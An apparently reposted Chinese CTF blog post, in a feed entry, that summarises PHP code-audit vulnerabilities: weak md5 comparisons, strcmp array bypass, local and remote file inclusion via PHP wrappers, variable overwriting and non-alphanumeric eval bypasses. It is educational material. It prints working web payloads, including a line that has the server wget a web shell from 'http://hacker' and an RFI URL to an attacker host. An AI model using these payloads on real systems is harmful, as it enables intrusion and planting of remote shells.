    <content type="html"><![CDATA[<p>文章首发于<a href="https://xz.aliyun.com/t/3085" target="_blank" rel="external">先知社区</a>，转载请注明来源。</p><p>在做ctf题的时候经常会遇到一些PHP代码审计的题目，这里将我遇到过的常见漏洞做一个小结。</p><h2 id="md5-漏洞"><a href="#md5-漏洞" class="headerlink" title="md5()漏洞"></a>md5()漏洞</h2><p>&nbsp;&nbsp;PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br>常见的payload有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line"> sha1(str)</span><br><span class="line">sha1(<span class="string">'aaroZmOk'</span>)  </span><br><span class="line">sha1(<span class="string">'aaK1STfY'</span>)</span><br><span class="line">sha1(<span class="string">'aaO8zKZF'</span>)</span><br><span class="line">sha1(<span class="string">'aa3OFF9m'</span>)</span><br></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;同时MD5不能处理数组，若有以下判断则可用数组绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@md5($_GET[<span class="string">'a'</span>]) == @md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"yes"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//http://127.0.0.1/1.php?a[]=1&amp;b[]=2</span></span><br></pre></td></tr></table></figure></p><p>判断代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))<span class="comment">//D0g3某道题</span></span><br></pre></td></tr></table></figure></p><h2 id="strcmp-漏洞"><a href="#strcmp-漏洞" class="headerlink" title="strcmp()漏洞"></a>strcmp()漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp(string $str1, string $str2)</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=$_GET[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="string">'*****'</span>,$password)) &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'NO!'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'YES!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;对于这段代码，我们能用什么办法绕过验证呢， 只要我们\$_POST[‘password’]是一个数组或者一个object即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢。<br>其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key），当作一个名字为xxx的数组构造类似如下的request<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: xxx.com</span><br><span class="line">Content-Length: 41</span><br><span class="line">Accept: application/json, text/javascript</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">password[]=admin</span><br></pre></td></tr></table></figure></p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br></pre></td></tr></table></figure><p>这四个函数会将包含的文件作为php文件解析</p><p>_once表示同名文件只引入一次，include在引入不存文件时产生一个警告且脚本还会继续执行，require则会导致一个致命性错误且脚本停止执行。<br>include()是有条件包含函数，而 require()则是无条件包含函数<br>include有返回值，而require没有<br>理论上来说：include和require后面加不加括号对执行结果没有区别，但是加上括号效率较低，所以后面能不加括号就不加括号。</p><p>可利用的文件包含漏洞条件：<br>1.include()等函数通过动态变量方式引入需要包含的文件<br>2.用户可控制该动态变量</p><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>若在同目录下有phpinfo.txt<figure class="highlight plain"><figcaption><span>phpinfo; ?>``` 则访问：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">index.php?file=phpinfo.txt</span><br></pre></td></tr></table></figure></p><p>即可解析文件内容<br>PHP内核是由C语言实现的，在连接字符串时，0字节(\x00)将作为字符串结束符。所以可用%00截断</p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><ol><li>allow_url_fopen = On</li><li>allow_url_include = On  默认为off<br>需要php.ini中两个配置均为ON</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($route == <span class="string">"share"</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span> $basePath . <span class="string">'/action/m_share.php'</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>($route == <span class="string">"sharelink"</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span> $basePath . <span class="string">'/action/m_sharelink.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造url<br><code>/?param=http://attacker/phpshell.txt?</code><br>可将远程的shell解析执行，最后一个问号可以起到截断的作用。</p><h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><h4 id="利用用户上传文件"><a href="#利用用户上传文件" class="headerlink" title="利用用户上传文件"></a>利用用户上传文件</h4><p>如果有上传点或者允许用户上传文件可以利用，不过比较难找到文件目录。</p><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p><code>allow_url_include = on</code><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 index.php?file=php://input</span><br><span class="line">2 POST:</span><br><span class="line">3 &lt;? phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure></p><hr><h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p>可以读取本地文件<br><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code><br>指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。</p><h5 id="php-phar"><a href="#php-phar" class="headerlink" title="php://phar"></a>php://phar</h5><p>PHP归档，解压缩协议<br>上传包含任何格式文件shell的压缩包，再用phar协议解析</p><ul><li>指定相对路径</li></ul><p><code>index.php?file=phar://shell.zip/phpinfo.txt</code></p><ul><li>指定绝对路径</li></ul><p><code>index.php?file=phar://D:/index/www/fileinclude/shell.zip/phpinfo.txt</code></p><h5 id="data"><a href="#data" class="headerlink" title="data:"></a>data:</h5><p>条件：</p><ol><li><code>allow_url_fopen = On</code></li><li><code>allow_url_include = On</code></li></ol><p><code>index.php?file=data:text/plain,&lt;?php phpinfo(); ?&gt;%00</code><br><code>index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p><h4 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h4><p>先通过读取httpd的配置文件httpd.conf,找日志文件所在目录<br>常见日志文件位置：<br>1.<code>../etc/httpd/conf/httpd.conf</code></p><ol start="2"><li><code>/usr/local/apache/conf/http.conf</code><br>3.<code>../apache/logs/error.log</code></li></ol><p>Metasploit有脚本完成自动化攻击</p><h4 id="包含Session"><a href="#包含Session" class="headerlink" title="包含Session"></a>包含Session</h4><p>要求攻击者能控制部分Session的内容<br>常见的php-session存放位置：</p><ol><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/tmp/sess_PHPSESSID</code></li><li><code>/tmp/sessions/sess_PHPSESSID</code></li></ol><h4 id="包含-proc-self-environ-文件"><a href="#包含-proc-self-environ-文件" class="headerlink" title="包含/proc/self/environ 文件"></a>包含/proc/self/environ 文件</h4><p><code>index.php?page=../../../../../proc/self/environ</code><br>可以看到Web进程运行时的环境变量，其中用户可以控制部分，比如对User-Agent注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'wget http://hacker/Shells/phpshell.txt -O shell.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="包含上传的临时文件"><a href="#包含上传的临时文件" class="headerlink" title="包含上传的临时文件"></a>包含上传的临时文件</h4><h4 id="包含其他应用创建的文件"><a href="#包含其他应用创建的文件" class="headerlink" title="包含其他应用创建的文件"></a>包含其他应用创建的文件</h4><p>如数据库文件，缓存文件</p><h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><ol><li>%00截断<br> <code>magic_quotes_gpc = off</code><br> PHP &lt; 5.3.4</li><li><p>字节长度截断：最大值Windows下256字节，Linux下4096字节</p></li><li><p>%00截断目录遍历<br> <code>/var/www/%00</code><br> <code>magic_quotes_gpc = off</code></p></li><li><p>编码绕过<br> <code>%2e%2e%2f   ../</code><br> <code>..%c0%af   ../</code><br> <code>%2e%2e%5c  ..\</code></p><h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3></li><li>在很多场景中都需要去包含web目录之外的文件，如果php配置了<strong>open_basedir</strong>，则会包含失败</li><li>做好文件的权限管理</li><li>对危险字符进行过滤等</li></ol><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><h3 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h3><p>条件：<code>register_globals = ON</code> 4.2.0后默认关闭 5.4.0后已移除<br>例bugku某题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>payload:<code>http://120.24.86.145:8004/index1.php?args=GLOBALS</code><br>因为有eval(“var_dump($$args);”); 直接用全局变量打印所有字符串即可得到flag</p><h2 id="strpos-的小坑"><a href="#strpos-的小坑" class="headerlink" title="strpos()的小坑"></a>strpos()的小坑</h2><h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>查找”touch”在字符串中第一次出现的位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strpos(<span class="string">"love is a touch and yet not a touch"</span>, <span class="string">"touch"</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。<br>strpos() 函数对大小写敏感。<br>该函数是二进制安全的。<br><code>strpos(string, find, start)</code> <em>string</em> 和 <em>find</em> 必需，<em>start</em> 可选，规定在何处开始搜索。</p><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><ul><li><strong>stripos()</strong> - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</li><li><strong>strripos()</strong> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><strong>strrpos()</strong> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul><h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>判断的时候是不能用 <em>!= false</em>来判断的，因为当查找的字符串位置为0 时也会判断成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a = <span class="string">"stark"</span>;</span><br><span class="line">$b = <span class="string">"s"</span>;</span><br><span class="line">$c = <span class="string">"k"</span>;</span><br><span class="line"></span><br><span class="line">var_dump(strpos($a, $b));</span><br><span class="line">var_dump(strpos($a, $c));</span><br><span class="line">var_dump(strpos($a, $b) != <span class="keyword">false</span>);</span><br><span class="line">var_dump(strpos($a, $b) !== <span class="keyword">false</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回结果：<br><img src="/2018/11/07/CTF中的常见PHP漏洞/1534852773118.png" alt="Alt text"></p><h2 id="PHP的一个小特性"><a href="#PHP的一个小特性" class="headerlink" title="PHP的一个小特性"></a>PHP的一个小特性</h2><p>乌云链接：<a href="https://wooyun.shuimugan.com/bug/view?bug_no=64792" target="_blank" rel="external">https://wooyun.shuimugan.com/bug/view?bug_no=64792</a><br>当代码中存在<em>\$_REQUEST[‘user_id’]</em>里面类似的参数的时候，我们在url上可以这样<em>a.php?user.id</em>传参去进行绕过,这样进去之后也能表示<em>$_REQUEST[‘user_id’]</em>的值，同样可以绕过的符号还有+，[ 等，应该说是php的一个小特性 </p><blockquote><p>安恒月赛 奇怪的恐龙特性</p></blockquote><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>阅读代码发现，首先第一步要绕过A_A这个符号，如果出现这个符号他就会显示A_A,have fun，就不能继续往下面执行到file_get_contents(‘flag.php’)了，但是我们发送get参数的时候又必须要发送，因此我们就用到刚才的知识点，我们可以用A.A或者是A+A去传参去绕过。<br>下面的代码就是常规的数字绕过了，但这里也用到了一个trick，就是无论你的数字多大，对于数组而言总是比数组小。</p><p>利用数组去绕过$str&lt;9999999999的特性，下面一个判断是强制转化为字符串在与数字比较的判断，这就是平常操作很多的弱类型了，直接让参数等于admin就可以了，因为“admin”== 0 ，结果是true，直接等于0绕过即可，所以这题的payload<br><code>http://101.71.29.5:10007/?A+A[]=admin</code></p><h2 id="极限利用"><a href="#极限利用" class="headerlink" title="极限利用"></a>极限利用</h2><blockquote><p>安恒九月赛 babybypass</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>根据代码要求：</p><pre><code>1. 长度不能大于352. 不能包含大小写字母，数字，下划线和$符号</code></pre><p>在linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用? * %等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试：<br><code>???/??? =&gt; /bin/cat</code><br>PHP开启短标签即<code>short_open_tag=on</code>时，可以使用<code>&lt;?=$_?&gt;</code>输出变量<br>于是读源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;</span><br><span class="line">&quot;/bin/cat /var/www/html/index.php&quot;</span><br></pre></td></tr></table></figure></p><p>长度超出上限，使用<em>通配：<br><code></code>$_=`/???/???%20/???/???/????/</em><code>;?&gt;&lt;?=$_?&gt;`</code><br>正则过滤了$和_,改进为：<br><code>?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;</code><br>可以读到：<br><img src="/2018/11/07/CTF中的常见PHP漏洞/1539239653355.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">    $flag = file_get_contents(&apos;/flag&apos;);</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>直接读flag文件<br><code>?&gt;&lt;?=&#39;/???/???%20/????&#39;;?&gt;</code></p><p>另外类似的一道题</p><blockquote><p>道格bypass<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;50)&#123;</span><br><span class="line">        die(&quot;Too Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;Not Allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br></pre></td></tr></table></figure></p></blockquote><p>相关文章：<br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="external">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$￥=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot; // _GET</span><br></pre></td></tr></table></figure></p><p>利用<code>${}</code>中的代码会被执行的特点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$￥&#125;[￥]($&#123;$￥&#125;[￥￥]);</span><br></pre></td></tr></table></figure></p><p>传参<br><code>&amp;￥=Flag</code><br>最终payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$￥=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$￥&#125;[￥]($&#123;$￥&#125;[￥￥]);&amp;￥=Flag</span><br></pre></td></tr></table></figure></p><h2 id="is-numeric绕过"><a href="#is-numeric绕过" class="headerlink" title="is_numeric绕过"></a>is_numeric绕过</h2><blockquote><p>极客大挑战</p></blockquote><p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;p1&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">if ($_GET[&apos;p1&apos;] &gt; 99999999 &amp;&amp; strlen($_GET[&apos;p1&apos;]) &lt; 9)&#123;</span><br><span class="line">echo &quot;111&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ( $_GET [&apos;p2&apos;] )) &#123;</span><br><span class="line">$p2 = $_GET [&apos;p2&apos;];</span><br><span class="line">if (is_numeric($p2))&#123;</span><br><span class="line">die(&apos;Input cannot be a number!!!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">switch ($p2) &#123;</span><br><span class="line">case 0 :</span><br><span class="line">break;</span><br><span class="line">case 1 :</span><br><span class="line">break;</span><br><span class="line">case 2 :</span><br><span class="line">echo &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">break;</span><br><span class="line">default :</span><br><span class="line">echo &quot;2333333&quot;;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>第一个常见的&gt;999999999，用指数1e9即可绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1e9; //1000000000</span><br></pre></td></tr></table></figure></p><p>第二个函数<code>is_numeric()</code>判断是否为数字，因为PHP的弱类型，将数字后面加上空格或者任意一个字符即可绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &apos;1&apos;;</span><br><span class="line">$b = &apos;1a&apos;;</span><br><span class="line">$c = &apos;1 &apos;;</span><br><span class="line"></span><br><span class="line">var_dump(is_numeric($a));//true</span><br><span class="line">var_dump(is_numeric($b));//false</span><br><span class="line">var_dump(is_numeric($c));//false</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>最终payload：<br><code>?p1=1e9&amp;p2=2%20</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章首发于&lt;a href=&quot;https://xz.aliyun.com/t/3085&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;先知社区&lt;/a&gt;，转载请注明来源。&lt;/p&gt;
&lt;p&gt;在做ctf题的时候经常会遇到一些PHP代码审计的题目，这里将我遇到过的常见
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
      <category term="php" scheme="https://www.twosmi1e.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络</title>
